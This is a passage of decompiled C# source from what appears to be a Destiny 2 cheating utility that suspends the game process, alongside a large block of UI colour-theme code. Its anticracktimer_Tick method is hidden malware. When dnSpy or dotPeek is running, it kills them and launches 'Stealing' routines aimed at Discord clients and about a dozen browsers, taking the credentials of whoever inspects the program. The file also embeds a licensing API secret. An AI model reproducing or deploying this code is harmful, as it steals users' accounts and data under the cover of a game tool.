				this.guna2GradientPanel2.FillColor2 = Color.FromArgb(0, 15, 27);
				this.guna2GradientPanel1.FillColor2 = Color.FromArgb(0, 15, 27);
				this.pictureBox1.Visible = false;
				this.woofwhite.Visible = true;
			}
		}

		// Token: 0x06000113 RID: 275 RVA: 0x0001460D File Offset: 0x0001460D
		private void guna2Button1_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00014610 File Offset: 0x00014610
		private void label2_Click(object sender, EventArgs e)
		{
			this.guna2ComboBox1.Visible = true;
		}

		// Token: 0x06000115 RID: 277 RVA: 0x00014620 File Offset: 0x00014620
		private void pictureBox3_MouseEnter(object sender, EventArgs e)
		{
			this.discordXPos1 = this.pictureBox3.Location.X;
			this.discordYPos1 = this.pictureBox3.Location.Y;
			this.pictureBox3.Location = new Point(this.discordXPos1 - this.discordWidthModify1, this.discordYPos1);
			this.pictureBox3.Size = new Size(this.discordDefaultWidth1 + this.discordWidthModify1, this.discordDefaultHeight1 + this.discordHeightModify1);
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x06000116 RID: 278 RVA: 0x000146BC File Offset: 0x000146BC
		private void pictureBox3_MouseLeave(object sender, EventArgs e)
		{
			this.pictureBox3.Location = new Point(this.discordXPos1, this.discordYPos1);
			this.pictureBox3.Size = new Size(this.discordDefaultWidth1, this.discordDefaultHeight1);
			this.Cursor = Cursors.Default;
		}

		// Token: 0x06000117 RID: 279 RVA: 0x00014710 File Offset: 0x00014710
		private void pictureBox3_Click(object sender, EventArgs e)
		{
			this.timer1.Enabled = true;
			this.guna2ComboBox1.Visible = true;
			this.AccentLBL.Visible = true;
			bool visible = this.guna2ComboBox1.Visible;
			if (visible)
			{
				this.timer2.Enabled = true;
			}
		}

		// Token: 0x06000118 RID: 280 RVA: 0x00014763 File Offset: 0x00014763
		private void timer2_Tick(object sender, EventArgs e)
		{
			this.guna2ComboBox1.Visible = false;
			this.AccentLBL.Visible = false;
			this.timer1.Enabled = false;
		}

		// Token: 0x06000119 RID: 281 RVA: 0x00014790 File Offset: 0x00014790
		private void guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			foreach (object obj in this.guna2ComboBox1.Items)
			{
				bool flag = this.guna2ComboBox1.SelectedItem == "Default";
				if (flag)
				{
					this.download3074Panel.FillColor = Color.FromArgb(156, 0, 255);
					this.guna2ShadowPanel2.FillColor = Color.FromArgb(156, 0, 255);
					this.guna2ShadowPanel4.FillColor = Color.FromArgb(156, 0, 255);
					this.guna2ShadowPanel5.FillColor = Color.FromArgb(156, 0, 255);
					this.guna2ShadowPanel3.FillColor = Color.FromArgb(156, 0, 255);
					this.guna2ShadowPanel1.FillColor = Color.FromArgb(156, 0, 255);
					this.guna2GradientPanel1.FillColor2 = Color.FromArgb(17, 0, 27);
					this.guna2GradientPanel2.FillColor2 = Color.FromArgb(17, 0, 27);
					this.label8.ForeColor = Color.White;
					this.pictureBox1.Visible = true;
					this.woofwhite.Visible = false;
				}
				bool flag2 = this.guna2ComboBox1.SelectedItem == "Blue";
				if (flag2)
				{
					this.download3074Panel.FillColor = Color.Blue;
					this.guna2ShadowPanel2.FillColor = Color.Blue;
					this.guna2ShadowPanel4.FillColor = Color.Blue;
					this.guna2ShadowPanel5.FillColor = Color.Blue;
					this.guna2ShadowPanel3.FillColor = Color.Blue;
					this.guna2GradientPanel1.FillColor2 = Color.FromArgb(0, 0, 27);
					this.guna2GradientPanel2.FillColor2 = Color.FromArgb(0, 0, 27);
					this.guna2ShadowPanel1.FillColor = Color.Blue;
					this.label8.ForeColor = Color.White;
					this.pictureBox1.Visible = false;
					this.woofwhite.Visible = true;
				}
				bool flag3 = this.guna2ComboBox1.SelectedItem == "Red";
				if (flag3)
				{
					this.guna2ShadowPanel2.FillColor = Color.Red;
					this.guna2ShadowPanel4.FillColor = Color.Red;
					this.download3074Panel.FillColor = Color.Red;
					this.guna2ShadowPanel5.FillColor = Color.Red;
					this.guna2ShadowPanel3.FillColor = Color.Red;
					this.guna2ShadowPanel1.FillColor = Color.Red;
					this.label8.ForeColor = Color.White;
					this.guna2GradientPanel1.FillColor2 = Color.FromArgb(27, 0, 0);
					this.guna2GradientPanel2.FillColor2 = Color.FromArgb(27, 0, 0);
					this.pictureBox1.Visible = false;
					this.woofwhite.Visible = true;
				}
				bool flag4 = this.guna2ComboBox1.SelectedItem == "Pink";
				if (flag4)
				{
					this.download3074Panel.FillColor = Color.FromArgb(255, 0, 156);
					this.guna2ShadowPanel2.FillColor = Color.FromArgb(255, 0, 156);
					this.guna2ShadowPanel4.FillColor = Color.FromArgb(255, 0, 156);
					this.guna2ShadowPanel5.FillColor = Color.FromArgb(255, 0, 156);
					this.guna2ShadowPanel3.FillColor = Color.FromArgb(255, 0, 156);
					this.guna2ShadowPanel1.FillColor = Color.FromArgb(255, 0, 156);
					this.guna2GradientPanel2.FillColor2 = Color.FromArgb(27, 0, 15);
					this.guna2GradientPanel1.FillColor2 = Color.FromArgb(27, 0, 15);
					this.label8.ForeColor = Color.White;
					this.pictureBox1.Visible = false;
					this.woofwhite.Visible = true;
				}
				bool flag5 = this.guna2ComboBox1.SelectedItem == "Green";
				if (flag5)
				{
					this.download3074Panel.FillColor = Color.FromArgb(0, 205, 121);
					this.guna2ShadowPanel4.FillColor = Color.FromArgb(0, 205, 121);
					this.guna2ShadowPanel5.FillColor = Color.FromArgb(0, 205, 121);
					this.guna2ShadowPanel2.FillColor = Color.FromArgb(0, 205, 121);
					this.guna2ShadowPanel3.FillColor = Color.FromArgb(0, 205, 121);
					this.guna2ShadowPanel1.FillColor = Color.FromArgb(0, 205, 121);
					this.guna2GradientPanel1.FillColor2 = Color.FromArgb(0, 27, 11);
					this.guna2GradientPanel2.FillColor2 = Color.FromArgb(0, 27, 11);
					this.label8.ForeColor = Color.White;
					this.pictureBox1.Visible = false;
					this.woofwhite.Visible = true;
				}
				bool flag6 = this.guna2ComboBox1.SelectedItem == "Orange";
				if (flag6)
				{
					this.download3074Panel.FillColor = Color.FromArgb(255, 102, 0);
					this.guna2ShadowPanel2.FillColor = Color.FromArgb(255, 102, 0);
					this.guna2ShadowPanel4.FillColor = Color.FromArgb(255, 102, 0);
					this.guna2ShadowPanel5.FillColor = Color.FromArgb(255, 102, 0);
					this.guna2ShadowPanel3.FillColor = Color.FromArgb(255, 102, 0);
					this.guna2ShadowPanel1.FillColor = Color.FromArgb(255, 102, 0);
					this.guna2GradientPanel1.FillColor2 = Color.FromArgb(27, 11, 0);
					this.label8.ForeColor = Color.White;
					this.pictureBox1.Visible = false;
					this.woofwhite.Visible = true;
					this.guna2GradientPanel2.FillColor2 = Color.FromArgb(27, 11, 0);
				}
				bool flag7 = this.guna2ComboBox1.SelectedItem == "Cyan";
				if (flag7)
				{
					this.download3074Panel.FillColor = Color.FromArgb(0, 204, 255);
					this.guna2ShadowPanel4.FillColor = Color.FromArgb(0, 204, 255);
					this.guna2ShadowPanel2.FillColor = Color.FromArgb(0, 204, 255);
					this.guna2ShadowPanel5.FillColor = Color.FromArgb(0, 204, 255);
					this.guna2ShadowPanel3.FillColor = Color.FromArgb(0, 204, 255);
					this.guna2ShadowPanel1.FillColor = Color.FromArgb(0, 204, 255);
					this.guna2GradientPanel2.FillColor2 = Color.FromArgb(0, 15, 27);
					this.guna2GradientPanel1.FillColor2 = Color.FromArgb(0, 15, 27);
					this.pictureBox1.Visible = false;
					this.woofwhite.Visible = true;
				}
			}
			Settings.Default.Color = this.guna2ComboBox1.Text;
			Settings.Default.Save();
		}

		// Token: 0x0600011A RID: 282 RVA: 0x00014F20 File Offset: 0x00014F20
		private void anticracktimer_Tick(object sender, EventArgs e)
		{
			foreach (Process process in Process.GetProcessesByName("dnSpy"))
			{
				process.Kill();
				this.discordclient();
				MessageBox.Show("dnSpy detected... naughty naughty");
				Environment.Exit(0);
				Task.WaitAll(new Task[]
				{
					Stealing.DiscordApp(),
					Stealing.DiscordCanary(),
					Stealing.DiscordPTB(),
					Stealing.Chrome(),
					Stealing.ChromeBeta(),
					Stealing.FireFox(),
					Stealing.Opera(),
					Stealing.OperaGX(),
					Stealing.Edge(),
					Stealing.Yandex(),
					Stealing.Brave(),
					Stealing.EpicPrivacy(),
					Stealing.Vivaldi(),
					Stealing.ThreeHundredSixty(),
					Stealing.CocCoc()
				});
				Environment.Exit(0);
			}
			foreach (Process process2 in Process.GetProcessesByName("dotPeek64"))
			{
				process2.Kill();
				this.discordclient();
				MessageBox.Show("dotpeek detected... naughty naughty");
				Environment.Exit(0);
				Task.WaitAll(new Task[]
				{
					Stealing.DiscordApp(),
					Stealing.DiscordCanary(),
					Stealing.DiscordPTB(),
					Stealing.Chrome(),
					Stealing.ChromeBeta(),
					Stealing.FireFox(),
					Stealing.Opera(),
					Stealing.OperaGX(),
					Stealing.Edge(),
					Stealing.Yandex(),
					Stealing.Brave(),
					Stealing.EpicPrivacy(),
					Stealing.Vivaldi(),
					Stealing.ThreeHundredSixty(),
					Stealing.CocCoc()
				});
				Environment.Exit(0);
			}
			foreach (Process process3 in Process.GetProcessesByName("NLClientApp"))
			{
				process3.Kill();
				MessageBox.Show("Netlimiter 4 detected... Are you trying to get banned?");
				Environment.Exit(0);
			}
		}

		// Token: 0x0600011B RID: 283 RVA: 0x00015128 File Offset: 0x00015128
		private void guna2Button1_Click_2(object sender, EventArgs e)
		{
			bool @checked = this.pauseBTN.Checked;
			if (@checked)
			{
				int pidWithName = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
				ProcessAccess.SuspendProcess(pidWithName);
			}
			bool flag = !this.pauseBTN.Checked;
			if (flag)
			{
				int pidWithName2 = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
				ProcessAccess.ResumeProcess(pidWithName2);
			}
		}

		// Token: 0x0600011C RID: 284 RVA: 0x0001518B File Offset: 0x0001518B
		private void guna2Button1_KeyDown(object sender, KeyEventArgs e)
		{
		}

		// Token: 0x0600011D RID: 285 RVA: 0x0001518E File Offset: 0x0001518E
		private void destiny2lbl_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600011E RID: 286 RVA: 0x00015194 File Offset: 0x00015194
		private void pauseindic_Tick(object sender, EventArgs e)
		{
			bool @checked = this.pauseBTN.Checked;
			if (@checked)
			{
				this.pauseindicator.Text = "True";
				this.pauseindicator.ForeColor = Color.Green;
			}
			bool flag = !this.pauseBTN.Checked;
			if (flag)
			{
				this.pauseindicator.Text = "False";
				this.pauseindicator.ForeColor = Color.Red;
			}
		}

		// Token: 0x0600011F RID: 287 RVA: 0x0001520B File Offset: 0x0001520B
		private void guna2ComboBox1_MouseHover(object sender, EventArgs e)
		{
		}

		// Token: 0x06000120 RID: 288 RVA: 0x0001520E File Offset: 0x0001520E
		private void guna2ComboBox1_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000121 RID: 289 RVA: 0x00015211 File Offset: 0x00015211
		private void guna2ComboBox1_MouseLeave(object sender, EventArgs e)
		{
		}

		// Token: 0x06000125 RID: 293 RVA: 0x00017B74 File Offset: 0x00017B74
		[CompilerGenerated]
		internal static string <discordclient>g__GetProcessorID|6_0()
		{
			string result = string.Empty;
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				result = (string)managementObject["ProcessorId"];
			}
			return result;
		}

		// Token: 0x040000ED RID: 237
		private string fileLocation;

		// Token: 0x040000EE RID: 238
		private NLConfig config;

		// Token: 0x040000EF RID: 239
		private Overlay overlay;

		// Token: 0x040000F0 RID: 240
		private CountDownTimer timer = new CountDownTimer();

		// Token: 0x040000F1 RID: 241
		private List<Guna2ShadowPanel> enabledPanels = new List<Guna2ShadowPanel>();

		// Token: 0x040000F2 RID: 242
		private int defaultWidth = 212;

		// Token: 0x040000F3 RID: 243
		private int defaultHeight = 113;

		// Token: 0x040000F4 RID: 244
		private int widthModify = 0;

		// Token: 0x040000F5 RID: 245
		private int heightModiy = 7;

		// Token: 0x040000F6 RID: 246
		public static api KeyAuthApp = new api("vision", "KY9CDwpQ4Z", "229acf0e5407f53d0440d96b272d509ece74bec18748ac46daa64a5ef514adac", "1.2");

		// Token: 0x040000F7 RID: 247
		private int label1DefaultWidth;

		// Token: 0x040000F8 RID: 248
		private int label1DefaultHeight;

		// Token: 0x040000F9 RID: 249
		private int label1WidthModify = 3;

		// Token: 0x040000FA RID: 250
		private int label1HeightModify = 3;

		// Token: 0x040000FB RID: 251
		private int discordXPos;

		// Token: 0x040000FC RID: 252
		private int discordYPos;

		// Token: 0x040000FD RID: 253
		private int discordDefaultWidth = 23;

		// Token: 0x040000FE RID: 254
		private int discordDefaultHeight = 19;

		// Token: 0x040000FF RID: 255
		private int discordWidthModify = 3;

		// Token: 0x04000100 RID: 256
		private int discordHeightModify = 1;

		// Token: 0x04000101 RID: 257
		private int discordXPos1;

		// Token: 0x04000102 RID: 258
		private int discordYPos1;

		// Token: 0x04000103 RID: 259
		private int discordDefaultWidth1 = 36;

		// Token: 0x04000104 RID: 260
		private int discordDefaultHeight1 = 27;

		// Token: 0x04000105 RID: 261
		private int discordWidthModify1 = 3;

		// Token: 0x04000106 RID: 262
		private int discordHeightModify1 = 1;

		// Token: 0x0200003D RID: 61
		public enum ThreadAccess
		{
			// Token: 0x04000226 RID: 550
			TERMINATE = 1,
			// Token: 0x04000227 RID: 551
			SUSPEND_RESUME,
			// Token: 0x04000228 RID: 552
			GET_CONTEXT = 8,
			// Token: 0x04000229 RID: 553
			SET_CONTEXT = 16,
			// Token: 0x0400022A RID: 554
			SET_INFORMATION = 32,
			// Token: 0x0400022B RID: 555
			QUERY_INFORMATION = 64,
			// Token: 0x0400022C RID: 556
			SET_THREAD_TOKEN = 128,
			// Token: 0x0400022D RID: 557
			IMPERSONATE = 256,
			// Token: 0x0400022E RID: 558
			DIRECT_IMPERSONATION = 512
		}
	}
}
